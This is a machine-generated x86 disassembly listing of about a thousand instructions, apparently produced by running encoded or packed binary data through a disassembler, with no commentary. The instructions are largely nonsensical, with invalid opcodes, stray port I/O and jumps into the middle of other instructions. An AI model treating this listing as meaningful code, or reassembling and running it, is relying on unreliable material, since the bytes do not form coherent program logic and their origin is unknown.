  408d2a:	9f                   	lahf
  408d2b:	5f                   	pop    %edi
  408d2c:	2d b5 2c 18 ac       	sub    $0xac182cb5,%eax
  408d31:	60                   	pusha
  408d32:	a0 60 88 18 65       	mov    0x65188860,%al
  408d37:	5f                   	pop    %edi
  408d38:	9f                   	lahf
  408d39:	eb ed                	jmp    0x408d28
  408d3b:	ec                   	in     (%dx),%al
  408d3c:	2d a5 30 1a b8       	sub    $0xb81a30a5,%eax
  408d41:	da e0                	(bad)
  408d43:	60                   	pusha
  408d44:	88 5c 4d 5f          	mov    %bl,0x5f(%ebp,%ecx,2)
  408d48:	9f                   	lahf
  408d49:	eb f5                	jmp    0x408d40
  408d4b:	f0 2d ad 88 eb e5    	lock sub $0xe5eb88ad,%eax
  408d51:	4c                   	dec    %esp
  408d52:	88 ce                	mov    %cl,%dh
  408d54:	82 5f 9f eb          	sbbb   $0xeb,-0x61(%edi)
  408d58:	e5 48                	in     $0x48,%eax
  408d5a:	88 fa                	mov    %bh,%dl
  408d5c:	4d                   	dec    %ebp
  408d5d:	5f                   	pop    %edi
  408d5e:	9f                   	lahf
  408d5f:	e3 98                	jecxz  0x408cf9
  408d61:	6c                   	insb   (%dx),%es:(%edi)
  408d62:	15 8b 2d a5 88       	adc    $0x88a52d8b,%eax
  408d67:	48                   	dec    %eax
  408d68:	79 0f                	jns    0x408d79
  408d6a:	9f                   	lahf
  408d6b:	5f                   	pop    %edi
  408d6c:	2d b5 7b 19 ac       	sub    $0xac197bb5,%eax
  408d71:	60                   	pusha
  408d72:	a0 60 88 7c 3a       	mov    0x3a7c8860,%al
  408d77:	5f                   	pop    %edi
  408d78:	9f                   	lahf
  408d79:	e1 1d                	loope  0x408d98
  408d7b:	3b a0 60 9f 5f 15    	cmp    0x155f9f60(%eax),%esp
  408d81:	6d                   	insl   (%dx),%es:(%edi)
  408d82:	2b a5 9c eb f5 4c    	sub    0x4cf5eb9c(%ebp),%esp
  408d88:	88 a0 4c 5f 9f 4b    	mov    %ah,0x4b9f5f4c(%eax)
  408d8e:	ac                   	lods   %ds:(%esi),%al
  408d8f:	e3 67                	jecxz  0x408df8
  408d91:	64 9f                	fs lahf
  408d93:	ad                   	lods   %ds:(%esi),%eax
  408d94:	98                   	cwtl
  408d95:	6f                   	outsl  %ds:(%esi),(%dx)
  408d96:	25 94 9d 5f 9f       	and    $0x9f5f9d94,%eax
  408d9b:	93                   	xchg   %eax,%ebx
  408d9c:	60                   	pusha
  408d9d:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  408da2:	b0 4b                	mov    $0x4b,%al
  408da4:	aa                   	stos   %al,%es:(%edi)
  408da5:	49                   	dec    %ecx
  408da6:	87 05 9f 5f 88 fa    	xchg   %eax,0xfa885f9f
  408dac:	47                   	inc    %edi
  408dad:	5f                   	pop    %edi
  408dae:	9f                   	lahf
  408daf:	93                   	xchg   %eax,%ebx
  408db0:	60                   	pusha
  408db1:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  408db6:	b0 c8                	mov    $0xc8,%al
  408db8:	f5                   	cmc
  408db9:	d9 e0                	fchs
  408dbb:	60                   	pusha
  408dbc:	2d a5 2c 1a b3       	sub    $0xb31a2ca5,%eax
  408dc1:	60                   	pusha
  408dc2:	a0 60 88 34 4b       	mov    0x4b348860,%al
  408dc7:	5f                   	pop    %edi
  408dc8:	9f                   	lahf
  408dc9:	ed                   	in     (%dx),%eax
  408dca:	e5 48                	in     $0x48,%eax
  408dcc:	5a                   	pop    %edx
  408dcd:	64 a0 60 a0 48 67    	mov    %fs:0x6748a060,%al
  408dd3:	0b 9f 5f 63 49 81    	or     -0x7eb69ca1(%edi),%ebx
  408dd9:	06                   	push   %es
  408dda:	9f                   	lahf
  408ddb:	5f                   	pop    %edi
  408ddc:	8b 3e                	mov    (%esi),%edi
  408dde:	ff                   	(bad)
  408ddf:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  408de4:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  408de7:	5f                   	pop    %edi
  408de8:	9f                   	lahf
  408de9:	7b a0                	jnp    0x408d8b
  408deb:	60                   	pusha
  408dec:	a0 c1 d1 91 e6       	mov    0xe691d1c1,%al
  408df1:	c5 0a                	lds    (%edx),%ecx
  408df3:	ba d7 c5 e3 d8       	mov    $0xd8e3c5d7,%edx
  408df8:	f1                   	int1
  408df9:	b3 d3                	mov    $0xd3,%bl
  408dfb:	b4 e3                	mov    $0xe3,%ah
  408dfd:	90                   	nop
  408dfe:	ef                   	out    %eax,(%dx)
  408dff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408e00:	01 8b e5 a4 f8 da    	add    %ecx,-0x25075b1b(%ebx)
  408e06:	e8 b0 a0 5f 9f       	call   0x9fa02ebb
  408e0b:	5f                   	pop    %edi
  408e0c:	9f                   	lahf
  408e0d:	76 a0                	jbe    0x408daf
  408e0f:	60                   	pusha
  408e10:	a0 b5 06 91 ea       	mov    0xea9106b5,%al
  408e15:	90                   	nop
  408e16:	e4 d9                	in     $0xd9,%al
  408e18:	f1                   	int1
  408e19:	b1 f4                	mov    $0xf4,%cl
  408e1b:	b8 19 d6 f6 8b       	mov    $0x8bf6d619,%eax
  408e20:	19 d2                	sbb    %edx,%edx
  408e22:	e4 b2                	in     $0xb2,%al
  408e24:	06                   	push   %es
  408e25:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408e26:	ef                   	out    %eax,(%dx)
  408e27:	60                   	pusha
  408e28:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408e2d:	76 a0                	jbe    0x408dcf
  408e2f:	60                   	pusha
  408e30:	a0 93 15 b1 ed       	mov    0xedb11593,%al
  408e35:	ba e2 d9 17 8f       	mov    $0x8f17d9e2,%edx
  408e3a:	18 94 f7 99 05 8b 0d 	sbb    %dl,0xd8b0599(%edi,%esi,8)
  408e41:	c1 d5 99             	rcl    $0x99,%ebp
  408e44:	e4 a1                	in     $0xa1,%al
  408e46:	ef                   	out    %eax,(%dx)
  408e47:	60                   	pusha
  408e48:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408e4d:	77 a0                	ja     0x408def
  408e4f:	60                   	pusha
  408e50:	a0 ae e4 a9 f2       	mov    0xf2a9e4ae,%al
  408e55:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408e56:	e2 d8                	loop   0x408e30
  408e58:	e9 b0 0f aa 13       	jmp    0x13ea9e0d
  408e5d:	d5 0f                	aad    $0xf
  408e5f:	90                   	nop
  408e60:	09 c4                	or     %eax,%esp
  408e62:	ef                   	out    %eax,(%dx)
  408e63:	b3 ec                	mov    $0xec,%bl
  408e65:	c2 ea b0             	ret    $0xb0ea
  408e68:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408e6d:	7a a0                	jp     0x408e0f
  408e6f:	60                   	pusha
  408e70:	a0 96 e6 b9 02       	mov    0x2b9e696,%al
  408e75:	ca d6 8b             	lret   $0x8bd6
  408e78:	12 96 e2 d8 ed a6    	adc    -0x5912271e(%esi),%dl
  408e7e:	d0 cb                	ror    $1,%bl
  408e80:	e2 c2                	loop   0x408e44
  408e82:	12 c8                	adc    %al,%cl
  408e84:	cb                   	lret
  408e85:	d2 f8                	sar    %cl,%al
  408e87:	91                   	xchg   %eax,%ecx
  408e88:	f9                   	stc
  408e89:	aa                   	stos   %al,%es:(%edi)
  408e8a:	ef                   	out    %eax,(%dx)
  408e8b:	60                   	pusha
  408e8c:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408e91:	61                   	popa
  408e92:	a0 60 a0 8f a0       	mov    0xa08fa060,%al
  408e97:	60                   	pusha
  408e98:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408e9d:	61                   	popa
  408e9e:	a0 60 a0 8d a0       	mov    0xa08da060,%al
  408ea3:	60                   	pusha
  408ea4:	a0 b5 2b 4c 0a       	mov    0xa4c2bb5,%al
  408ea9:	60                   	pusha
  408eaa:	0a 60 0a             	or     0xa(%eax),%ah
  408ead:	60                   	pusha
  408eae:	f3 b6 f7             	repz mov $0xf7,%dh
  408eb1:	eb 7a                	jmp    0x408f2d
  408eb3:	eb 90                	jmp    0x408e45
  408eb5:	93                   	xchg   %eax,%ebx
  408eb6:	60                   	pusha
  408eb7:	b5 08                	mov    $0x8,%ch
  408eb9:	8f                   	(bad)
  408eba:	1b a0 a0 c4 9f 90    	sbb    -0x6f603b60(%eax),%esp
  408ec0:	04 e9                	add    $0xe9,%al
  408ec2:	c0 eb 63             	shr    $0x63,%bl
  408ec5:	48                   	dec    %eax
  408ec6:	73 58                	jae    0x408f20
  408ec8:	9f                   	lahf
  408ec9:	5f                   	pop    %edi
  408eca:	d3 20                	shll   %cl,(%eax)
  408ecc:	f5                   	cmc
  408ecd:	c8 a7 db e0          	enter  $0xdba7,$0xe0
  408ed1:	60                   	pusha
  408ed2:	04 5f                	add    $0x5f,%al
  408ed4:	d0 c4                	rol    $1,%ah
  408ed6:	29 80 25 56 af e4    	sub    %eax,-0x1b50a9db(%eax)
  408edc:	46                   	inc    %esi
  408edd:	60                   	pusha
  408ede:	a0 60 2b 33 2b       	mov    0x2b332b60,%al
  408ee3:	26 88 64 96 5f       	mov    %ah,%es:0x5f(%esi,%edx,4)
  408ee8:	9f                   	lahf
  408ee9:	e1 db                	loope  0x408ec6
  408eeb:	60                   	pusha
  408eec:	a0 5f 9f 6f 25       	mov    0x256f9f5f,%al
  408ef1:	ea a0 60 a0 6f 57 a3 	ljmp   $0xa357,$0x6fa060a0
  408ef8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408ef9:	cb                   	lret
  408efa:	70 7a                	jo     0x408f76
  408efc:	23 22                	and    (%edx),%esp
  408efe:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408eff:	ed                   	in     (%dx),%eax
  408f00:	e5 5c                	in     $0x5c,%eax
  408f02:	88 76 4f             	mov    %dh,0x4f(%esi)
  408f05:	5f                   	pop    %edi
  408f06:	9f                   	lahf
  408f07:	ed                   	in     (%dx),%eax
  408f08:	e5 5c                	in     $0x5c,%eax
  408f0a:	88 96 4e 5f 9f eb    	mov    %dl,-0x1460a0b2(%esi)
  408f10:	70 eb                	jo     0x408efd
  408f12:	63 19                	arpl   %ebx,(%ecx)
  408f14:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408f15:	60                   	pusha
  408f16:	a0 60 88 d8 38       	mov    0x38d88860,%al
  408f1b:	5f                   	pop    %edi
  408f1c:	9f                   	lahf
  408f1d:	6f                   	outsl  %ds:(%esi),(%dx)
  408f1e:	57                   	push   %edi
  408f1f:	db a4 af 25 5f 1c 93 	(bad) -0x6ce3a0db(%edi,%ebp,4)
  408f26:	e7 93                	out    %eax,$0x93
  408f28:	96                   	xchg   %eax,%esi
  408f29:	cb                   	lret
  408f2a:	66 7a 23             	data16 jp 0x408f50
  408f2d:	20 a6 a0 29 a5 98    	and    %ah,-0x675ad660(%esi)
  408f33:	ed                   	in     (%dx),%eax
  408f34:	e5 5c                	in     $0x5c,%eax
  408f36:	88 6a 4e             	mov    %ch,0x4e(%edx)
  408f39:	5f                   	pop    %edi
  408f3a:	9f                   	lahf
  408f3b:	eb f5                	jmp    0x408f32
  408f3d:	58                   	pop    %eax
  408f3e:	2d b4 b0 5f 0b       	sub    $0xb5fb0b4,%eax
  408f43:	26 ad                	lods   %es:(%esi),%eax
  408f45:	eb eb                	jmp    0x408f32
  408f47:	66 2d 64 e1          	sub    $0xe164,%ax
  408f4b:	19 ba 60 a0 60 88    	sbb    %edi,-0x779f5fa0(%edx)
  408f51:	a0 38 5f 9f a6       	mov    0xa69f5f38,%al
  408f56:	ef                   	out    %eax,(%dx)
  408f57:	d5 70                	aad    $0x70
  408f59:	ed                   	in     (%dx),%eax
  408f5a:	f5                   	cmc
  408f5b:	54                   	push   %esp
  408f5c:	2b a5 9c 48 75 30    	sub    0x3075489c(%ebp),%esp
  408f62:	9f                   	lahf
  408f63:	5f                   	pop    %edi
  408f64:	2b b5 94 ed e5 5c    	sub    0x5ce5ed94(%ebp),%esi
  408f6a:	88 02                	mov    %al,(%edx)
  408f6c:	4a                   	dec    %edx
  408f6d:	5f                   	pop    %edi
  408f6e:	9f                   	lahf
  408f6f:	e3 1d                	jecxz  0x408f8e
  408f71:	5c                   	pop    %esp
  408f72:	a0 d5 b1 93 60       	mov    0x6093b1d5,%al
  408f77:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  408f7c:	b0 4b                	mov    $0x4b,%al
  408f7e:	bb eb 63 48 b7       	mov    $0xb74863eb,%ebx
  408f83:	58                   	pop    %eax
  408f84:	9f                   	lahf
  408f85:	5f                   	pop    %edi
  408f86:	d3 20                	shll   %cl,(%eax)
  408f88:	fa                   	cli
  408f89:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  408f8e:	8b 6a 89             	mov    -0x77(%edx),%ebp
  408f91:	5c                   	pop    %esp
  408f92:	43                   	inc    %ebx
  408f93:	5f                   	pop    %edi
  408f94:	9f                   	lahf
  408f95:	48                   	dec    %eax
  408f96:	4f                   	dec    %edi
  408f97:	05 9f 5f d3 20       	add    $0x20d35f9f,%eax
  408f9c:	fa                   	cli
  408f9d:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  408fa2:	08 96 1b a0 a0 ed    	or     %dl,-0x125f5fe5(%esi)
  408fa8:	e5 54                	in     $0x54,%eax
  408faa:	88 2a                	mov    %ch,(%edx)
  408fac:	49                   	dec    %ecx
  408fad:	5f                   	pop    %edi
  408fae:	9f                   	lahf
  408faf:	ed                   	in     (%dx),%eax
  408fb0:	e5 5c                	in     $0x5c,%eax
  408fb2:	88 22                	mov    %ah,(%edx)
  408fb4:	49                   	dec    %ecx
  408fb5:	5f                   	pop    %edi
  408fb6:	9f                   	lahf
  408fb7:	23 89 60 45 5f 9f    	and    -0x60a0baa0(%ecx),%ecx
  408fbd:	4b                   	dec    %ebx
  408fbe:	88 bf fe bb 2b 45    	mov    %bh,0x452bbbfe(%edi)
  408fc4:	fd                   	std
  408fc5:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  408fcb:	4c                   	dec    %esp
  408fcc:	59                   	pop    %ecx
  408fcd:	66 a0 60 a0 ca a0    	data16 mov 0xa0caa060,%al
  408fd3:	ca a0 a9             	lret   $0xa9a0
  408fd6:	15 59 f3 b6 f7       	adc    $0xf7b6f359,%eax
  408fdb:	eb 98                	jmp    0x408f75
  408fdd:	93                   	xchg   %eax,%ebx
  408fde:	60                   	pusha
  408fdf:	b5 08                	mov    $0x8,%ch
  408fe1:	d4 1d                	aam    $0x1d
  408fe3:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  408fe8:	04 e9                	add    $0xe9,%al
  408fea:	c0 ed ed             	shr    $0xed,%ch
  408fed:	5c                   	pop    %esp
  408fee:	d3 32                	shll   %cl,(%edx)
  408ff0:	58                   	pop    %eax
  408ff1:	ec                   	in     (%dx),%al
  408ff2:	1d a0 a0 48 ab       	sbb    $0xab48a0a0,%eax
  408ff7:	2c 9f                	sub    $0x9f,%al
  408ff9:	5f                   	pop    %edi
  408ffa:	2b 27                	sub    (%edi),%esp
  408ffc:	88 d8                	mov    %bl,%al
  408ffe:	49                   	dec    %ecx
  408fff:	5f                   	pop    %edi
  409000:	9f                   	lahf
  409001:	93                   	xchg   %eax,%ebx
  409002:	60                   	pusha
  409003:	b5 08                	mov    $0x8,%ch
  409005:	a2 1d a0 a0 c4       	mov    %al,0xc4a0a01d
  40900a:	9f                   	lahf
  40900b:	90                   	nop
  40900c:	04 e9                	add    $0xe9,%al
  40900e:	c0 48 69 49          	rorb   $0x49,0x69(%eax)
  409012:	9f                   	lahf
  409013:	5f                   	pop    %edi
  409014:	2d b5 8c 48 bd       	sub    $0xbd488cb5,%eax
  409019:	4a                   	dec    %edx
  40901a:	9f                   	lahf
  40901b:	5f                   	pop    %edi
  40901c:	2b a5 8c 48 ad 22    	sub    0x22ad488c(%ebp),%esp
  409022:	9f                   	lahf
  409023:	5f                   	pop    %edi
  409024:	2d b5 98 48 65       	sub    $0x654898b5,%eax
  409029:	22 9f 5f 2b a5 98    	and    -0x675ad4a1(%edi),%bl
  40902f:	48                   	dec    %eax
  409030:	71 23                	jno    0x409055
  409032:	9f                   	lahf
  409033:	5f                   	pop    %edi
  409034:	c5 63 a0             	lds    -0x60(%ebx),%esp
  409037:	60                   	pusha
  409038:	20 d9                	and    %bl,%cl
  40903a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40903b:	a8 23                	test   $0x23,%al
  40903d:	28 9c a0 23 20 a5 e9 	sub    %bl,-0x165adfdd(%eax,%eiz,4)
  409044:	e5 50                	in     $0x50,%eax
  409046:	5b                   	pop    %ebx
  409047:	61                   	popa
  409048:	a0 60 a0 eb e5       	mov    0xe5eba060,%al
  40904d:	58                   	pop    %eax
  40904e:	88 06                	mov    %al,(%esi)
  409050:	4a                   	dec    %edx
  409051:	5f                   	pop    %edi
  409052:	9f                   	lahf
  409053:	b0 2b                	mov    $0x2b,%al
  409055:	23 fa                	and    %edx,%edi
  409057:	eb 6a                	jmp    0x4090c3
  409059:	f9                   	stc
  40905a:	97                   	xchg   %eax,%edi
  40905b:	59                   	pop    %ecx
  40905c:	2b a5 98 ea b4 70    	sub    0x70b4ea98(%ebp),%esp
  409062:	2d a5 88 48 cb       	sub    $0xcb4888a5,%eax
  409067:	0a 9f 5f 2b a5 88    	or     -0x775ad4a1(%edi),%bl
  40906d:	48                   	dec    %eax
  40906e:	33 23                	xor    (%ebx),%esp
  409070:	9f                   	lahf
  409071:	5f                   	pop    %edi
  409072:	97                   	xchg   %eax,%edi
  409073:	4b                   	dec    %ebx
  409074:	f0 eb e5             	lock jmp 0x40905c
  409077:	5c                   	pop    %esp
  409078:	88 dc                	mov    %bl,%ah
  40907a:	4a                   	dec    %edx
  40907b:	5f                   	pop    %edi
  40907c:	9f                   	lahf
  40907d:	ba 32 eb 6a f9       	mov    $0xf96aeb32,%edx
  409082:	97                   	xchg   %eax,%edi
  409083:	59                   	pop    %ecx
  409084:	2b 52 e6             	sub    -0x1a(%edx),%edx
  409087:	e3 df                	jecxz  0x409068
  409089:	60                   	pusha
  40908a:	15 70 2b 27 2b       	adc    $0x2b272b70,%eax
  40908f:	b5 9c                	mov    $0x9c,%ch
  409091:	ea f4 92 9f 48 9b 09 	ljmp   $0x99b,$0x489f92f4
  409098:	9f                   	lahf
  409099:	5f                   	pop    %edi
  40909a:	8b 96 2d a5 84 eb    	mov    -0x147b5ad3(%esi),%edx
  4090a0:	f5                   	cmc
  4090a1:	5c                   	pop    %esp
  4090a2:	2a b4 d2 5f 88 4a 49 	sub    0x494a885f(%edx,%edx,8),%dh
  4090a9:	5f                   	pop    %edi
  4090aa:	9f                   	lahf
  4090ab:	eb e5                	jmp    0x409092
  4090ad:	44                   	inc    %esp
  4090ae:	2b 77 88             	sub    -0x78(%edi),%esi
  4090b1:	80 4d 5f 9f          	orb    $0x9f,0x5f(%ebp)
  4090b5:	e5 60                	in     $0x60,%eax
  4090b7:	d5 b9                	aad    $0xb9
  4090b9:	ed                   	in     (%dx),%eax
  4090ba:	e5 40                	in     $0x40,%eax
  4090bc:	2b b5 9c ea f4 92    	sub    -0x6d0b1564(%ebp),%esi
  4090c2:	9f                   	lahf
  4090c3:	48                   	dec    %eax
  4090c4:	6d                   	insl   (%dx),%es:(%edi)
  4090c5:	09 9f 5f 2b b5 80    	or     %ebx,-0x7f4ad4a1(%edi)
  4090cb:	eb 67                	jmp    0x409134
  4090cd:	48                   	dec    %eax
  4090ce:	cf                   	iret
  4090cf:	0a 9f 5f 2b 67 88    	or     -0x7798d4a1(%edi),%bl
  4090d5:	80 4a 5f 9f          	orb    $0x9f,0x5f(%edx)
  4090d9:	9b                   	fwait
  4090da:	e5 50                	in     $0x50,%eax
  4090dc:	14 6d                	adc    $0x6d,%al
  4090de:	e3 e1                	jecxz  0x4090c1
  4090e0:	9b                   	fwait
  4090e1:	60                   	pusha
  4090e2:	a0 60 20 6f 25       	mov    0x256f2060,%al
  4090e7:	c0 9f 5f 9f ed f5 3c 	rcrb   $0x3c,-0xa1260a1(%edi)
  4090ee:	2b a5 98 48 ff 1f    	sub    0x1fff4898(%ebp),%esp
  4090f4:	9f                   	lahf
  4090f5:	5f                   	pop    %edi
  4090f6:	2b b5 7c ed e5 58    	sub    0x58e5ed7c(%ebp),%esi
  4090fc:	88 70 49             	mov    %dh,0x49(%eax)
  4090ff:	5f                   	pop    %edi
  409100:	9f                   	lahf
  409101:	1b a1 60 a0 60 2b    	sbb    0x2b60a060(%ecx),%esp
  409107:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409108:	98                   	cwtl
  409109:	48                   	dec    %eax
  40910a:	8b 09                	mov    (%ecx),%ecx
  40910c:	9f                   	lahf
  40910d:	5f                   	pop    %edi
  40910e:	f0 eb 63             	lock jmp 0x409174
  409111:	ba 2b 2a 39 57       	mov    $0x57392a2b,%edx
  409116:	99                   	cltd
  409117:	eb e5                	jmp    0x4090fe
  409119:	58                   	pop    %eax
  40911a:	2a 74 b0 ed          	sub    -0x13(%eax,%esi,4),%dh
  40911e:	e5 38                	in     $0x38,%eax
  409120:	88 d0                	mov    %dl,%al
  409122:	49                   	dec    %ecx
  409123:	5f                   	pop    %edi
  409124:	9f                   	lahf
  409125:	eb e5                	jmp    0x40910c
  409127:	38 88 38 62 5f 9f    	cmp    %cl,-0x60a09dc8(%eax)
  40912d:	57                   	push   %edi
  40912e:	8b b0 2b a5 9c 48    	mov    0x489ca52b(%eax),%esi
  409134:	61                   	popa
  409135:	09 9f 5f fa f2 2b    	or     %ebx,0x2bf2fa5f(%edi)
  40913b:	2a 39                	sub    (%ecx),%bh
  40913d:	57                   	push   %edi
  40913e:	99                   	cltd
  40913f:	eb 92                	jmp    0x4090d3
  409141:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409142:	23 dd                	and    %ebp,%ebx
  409144:	94                   	xchg   %eax,%esp
  409145:	60                   	pusha
  409146:	15 71 2d a5 94       	adc    $0x94a52d71,%eax
  40914b:	eb f5                	jmp    0x409142
  40914d:	5c                   	pop    %esp
  40914e:	2a b4 d2 5f 88 9e 49 	sub    0x499e885f(%edx,%edx,8),%dh
  409155:	5f                   	pop    %edi
  409156:	9f                   	lahf
  409157:	4b                   	dec    %ebx
  409158:	d8 ed                	fsubr  %st(5),%st
  40915a:	e5 34                	in     $0x34,%eax
  40915c:	2b b5 9c ea f4 92    	sub    -0x6d0b1564(%ebp),%esi
  409162:	9f                   	lahf
  409163:	48                   	dec    %eax
  409164:	cd 09                	int    $0x9
  409166:	9f                   	lahf
  409167:	5f                   	pop    %edi
  409168:	2b a5 74 eb f5 54    	sub    0x54f5eb74(%ebp),%esp
  40916e:	88 c2                	mov    %al,%dl
  409170:	4c                   	dec    %esp
  409171:	5f                   	pop    %edi
  409172:	9f                   	lahf
  409173:	e5 60                	in     $0x60,%eax
  409175:	d5 ba                	aad    $0xba
  409177:	ed                   	in     (%dx),%eax
  409178:	e5 30                	in     $0x30,%eax
  40917a:	2b b5 9c ea f4 92    	sub    -0x6d0b1564(%ebp),%esi
  409180:	9f                   	lahf
  409181:	48                   	dec    %eax
  409182:	af                   	scas   %es:(%edi),%eax
  409183:	09 9f 5f 2b b5 70    	or     %ebx,0x70b52b5f(%edi)
  409189:	ed                   	in     (%dx),%eax
  40918a:	e5 54                	in     $0x54,%eax
  40918c:	88 d0                	mov    %dl,%al
  40918e:	49                   	dec    %ecx
  40918f:	5f                   	pop    %edi
  409190:	9f                   	lahf
  409191:	eb e5                	jmp    0x409178
  409193:	54                   	push   %esp
  409194:	88 c0                	mov    %al,%al
  409196:	49                   	dec    %ecx
  409197:	5f                   	pop    %edi
  409198:	9f                   	lahf
  409199:	e3 98                	jecxz  0x409133
  40919b:	63 14 6d e3 e1 9b 60 	arpl   %edx,0x609be1e3(,%ebp,2)
  4091a2:	a0 60 20 6f 25       	mov    0x256f2060,%al
  4091a7:	bb 9f 5f 9f 5f       	mov    $0x5f9f5f9f,%ebx
  4091ac:	d7                   	xlat   %ds:(%ebx)
  4091ad:	c8 58 dd e0          	enter  $0xdd58,$0xe0
  4091b1:	60                   	pusha
  4091b2:	9f                   	lahf
  4091b3:	d5 94                	aad    $0x94
  4091b5:	eb 67                	jmp    0x40921e
  4091b7:	1a a3 60 a0 60 88    	sbb    -0x779f5fa0(%ebx),%ah
  4091bd:	58                   	pop    %eax
  4091be:	49                   	dec    %ecx
  4091bf:	5f                   	pop    %edi
  4091c0:	9f                   	lahf
  4091c1:	93                   	xchg   %eax,%ebx
  4091c2:	60                   	pusha
  4091c3:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4091c8:	b0 4b                	mov    $0x4b,%al
  4091ca:	aa                   	stos   %al,%es:(%edi)
  4091cb:	49                   	dec    %ecx
  4091cc:	61                   	popa
  4091cd:	01 9f 5f 88 d4 43    	add    %ebx,0x43d4885f(%edi)
  4091d3:	5f                   	pop    %edi
  4091d4:	9f                   	lahf
  4091d5:	93                   	xchg   %eax,%ebx
  4091d6:	60                   	pusha
  4091d7:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4091dc:	b0 c8                	mov    $0xc8,%al
  4091de:	1b dd                	sbb    %ebp,%ebx
  4091e0:	e0 60                	loopne 0x409242
  4091e2:	2d a5 70 1a a8       	sub    $0xa81a70a5,%eax
  4091e7:	60                   	pusha
  4091e8:	a0 60 88 0e 47       	mov    0x470e8860,%al
  4091ed:	5f                   	pop    %edi
  4091ee:	9f                   	lahf
  4091ef:	ed                   	in     (%dx),%eax
  4091f0:	e5 54                	in     $0x54,%eax
  4091f2:	5a                   	pop    %edx
  4091f3:	63 a0 60 a0 48 41    	arpl   %esp,0x4148a060(%eax)
  4091f9:	07                   	pop    %es
  4091fa:	9f                   	lahf
  4091fb:	5f                   	pop    %edi
  4091fc:	63 49 5b             	arpl   %ecx,0x5b(%ecx)
  4091ff:	02 9f 5f 8b 3e ff    	add    -0xc174a1(%edi),%bl
  409205:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  40920a:	63 60 a0             	arpl   %esp,-0x60(%eax)
  40920d:	5f                   	pop    %edi
  40920e:	9f                   	lahf
  40920f:	5f                   	pop    %edi
  409210:	9f                   	lahf
  409211:	82 a0 60 a0 94 0c ae 	andb   $0xae,0xc94a060(%eax)
  409218:	cb                   	lret
  409219:	b8 d1 95 e4 aa       	mov    $0xaae495d1,%eax
  40921e:	e9 98 10 b7 ef       	jmp    0xeff7a2bb
  409223:	b0 ec                	mov    $0xec,%al
  409225:	93                   	xchg   %eax,%ebx
  409226:	e1 93                	loope  0x4091bb
  409228:	f1                   	int1
  409229:	d0 08                	rorb   $1,(%eax)
  40922b:	cb                   	lret
  40922c:	d3 97 e7 95 05 a1    	rcll   %cl,-0x5efa6a19(%edi)
  409232:	f8                   	clc
  409233:	a8 e8                	test   $0xe8,%al
  409235:	ac                   	lods   %ds:(%esi),%al
  409236:	ef                   	out    %eax,(%dx)
  409237:	60                   	pusha
  409238:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  40923d:	61                   	popa
  40923e:	a0 60 a0 8e a0       	mov    0xa08ea060,%al
  409243:	60                   	pusha
  409244:	a0 b5 2b 4c 59       	mov    0x594c2bb5,%al
  409249:	64 a0 60 a0 ca a0    	mov    %fs:0xa0caa060,%al
  40924f:	ca a0 a9             	lret   $0xa9a0
  409252:	15 59 f1 b3 f6       	adc    $0xf6b3f159,%eax
  409257:	b7 2b                	mov    $0x2b,%bh
  409259:	50                   	push   %eax
  40925a:	d3 20                	shll   %cl,(%eax)
  40925c:	f5                   	cmc
  40925d:	c8 d3 df e0          	enter  $0xdfd3,$0xe0
  409261:	60                   	pusha
  409262:	04 5f                	add    $0x5f,%al
  409264:	d0 c4                	rol    $1,%ah
  409266:	29 80 2b 26 88 6a    	sub    %eax,0x6a88262b(%eax)
  40926c:	47                   	inc    %edi
  40926d:	5f                   	pop    %edi
  40926e:	9f                   	lahf
  40926f:	12 a1 01 e4 95 e0    	adc    -0x1f6a1bff(%ecx),%ah
  409275:	60                   	pusha
  409276:	88 1a                	mov    %bl,(%edx)
  409278:	57                   	push   %edi
  409279:	5f                   	pop    %edi
  40927a:	9f                   	lahf
  40927b:	e9 e5 5c d3 20       	jmp    0x2113ef65
  409280:	f5                   	cmc
  409281:	c8 a6 df e0          	enter  $0xdfa6,$0xe0
  409285:	60                   	pusha
  409286:	04 5f                	add    $0x5f,%al
  409288:	d0 c4                	rol    $1,%ah
  40928a:	29 80 0a 60 2d ad    	sub    %eax,-0x52d29ff6(%eax)
  409290:	8c 93 72 18 ec df    	mov    %ss,-0x2013e78e(%ebx)
  409296:	e0 60                	loopne 0x4092f8
  409298:	88 c8                	mov    %cl,%al
  40929a:	69 5f 9f eb e5 4c f0 	imul   $0xf04ce5eb,-0x61(%edi),%ebx
  4092a1:	ed                   	in     (%dx),%eax
  4092a2:	e5 48                	in     $0x48,%eax
  4092a4:	88 ec                	mov    %ch,%ah
  4092a6:	85 5f 9f             	test   %ebx,-0x61(%edi)
  4092a9:	eb e5                	jmp    0x409290
  4092ab:	48                   	dec    %eax
  4092ac:	d3 29                	shrl   %cl,(%ecx)
  4092ae:	fa                   	cli
  4092af:	48                   	dec    %eax
  4092b0:	b5 39                	mov    $0x39,%ch
  4092b2:	9f                   	lahf
  4092b3:	5f                   	pop    %edi
  4092b4:	29 a5 9c eb e5 5c    	sub    %esp,0x5ce5eb9c(%ebp)
